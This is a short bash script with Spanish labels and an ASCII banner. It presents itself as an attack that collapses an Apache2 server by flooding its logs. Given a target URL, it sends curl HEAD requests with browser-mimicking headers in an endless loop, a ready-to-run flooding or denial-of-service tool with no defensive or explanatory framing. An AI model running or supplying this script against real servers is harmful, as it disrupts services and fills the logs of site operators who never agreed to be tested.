#!/bin/bash
Negro='\033[0;30m'
Rojo='\033[0;31m'
Verde='\033[0;32m'
Amarillo='\033[0;33m'
Azul='\033[0;34m'
Purpura='\033[0;35m'
Cyan='\033[0;36m'
Blanco='\033[0;37m'
Normal='\033[0m'
cat << "INFO"
        _                               _             
       | |                             | |            
   __ _| |_ __ _  __ _ _   _  ___  __ _| | ___   __ _ 
  / _` | __/ _` |/ _` | | | |/ _ \/ _` | |/ _ \ / _` |
 | (_| | || (_| | (_| | |_| |  __/ (_| | | (_) | (_| |
  \__,_|\__\__,_|\__, |\__,_|\___|\__,_|_|\___/ \__, |
                    | |                          __/ |
                    |_|                         |___/  v1.0
                    http://www.hackingyseguridad.con
INFO

if [ -z "$1" ]; then
        printf "${Amarillo}" ; echo
        echo "Ataque de colapaso Log de Apache2 Server."
        echo "Uso: $0 <URL>"; printf "${Normal}\n"
        exit 0
fi
echo
echo "================================================="
echo "Ataque sobre la url.: $1"
echo "================================================="
echo
while : ; do
      curl -v -I -k $1 \
-H 'Connection: keep-alive' \
-H 'Pragma: no-cache' \
-H 'Cache-Control: no-cache' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'User-Agent: --- ' \
-H 'Sec-Fetch-Mode: navigate' \
-H 'Sec-Fetch-User: ?1' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
-H 'Sec-Fetch-Site: none'  \
-H 'Accept-Encoding: gzip, deflate, br' \
-H 'Accept-Language: es-ES,es;q=0.9,en;q=0.8' \
; done
